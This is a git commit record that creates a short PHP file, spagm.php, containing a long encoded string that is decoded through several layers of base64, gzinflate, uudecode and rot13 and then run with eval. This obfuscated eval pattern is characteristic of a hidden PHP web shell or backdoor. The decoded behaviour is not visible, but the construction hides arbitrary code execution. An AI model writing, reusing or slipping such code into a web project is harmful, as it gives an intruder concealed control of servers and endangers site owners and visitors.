b7ea729d6a5281095166363a5e731f60f6f594d3
Nii-sanHaxor <45889833+arifarhan16@users.noreply.github.com>
2019-04-27 22:08:57 +0700

    Create spagm.php

---
+++ spagm.php
@@ -0,0 +1,5 @@
+<?php
+
+$asu = 'BcHZokJAAADQd39RmLGPXYoMirGMsitd/P9X3HMostHpclHePKqfjnuYcbvoA6dgSwL8W24M2ys8bIok9qUX/DRDF8mnGm9T+gUzQ6kMES4bR8z5ZFTymcV6ZpVEJkpZcv6LN3f95sYliZdStosK5mdudIpuP5AjMhQMZDZl9c7mu7+rNl47qm+r9ySai+kdJ0/xIQwDGns/v97DVIdGD8DPQA33kRg6pVatdawdZrRVinak7nT9xS0n9Fw/Sm54SYMfnQ4yL50n9dpmg94YPkeTcoRlqOrzulNyfQ+1z5+dnbZV/brBjuZ5ZHF7O13Z9zVUOmA7MRSq27zWrM9Kxu8Ql4yhSnDuy0u9pf7jeZ8ER4O7ZQJybvS0bKXiEWCtUKuxS1AxNlYt1FWECyCrfxhWjJHUzQ5bQ10yx9NfYRQl33W2goM5mH8=';
+
+eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode($asu)))))));
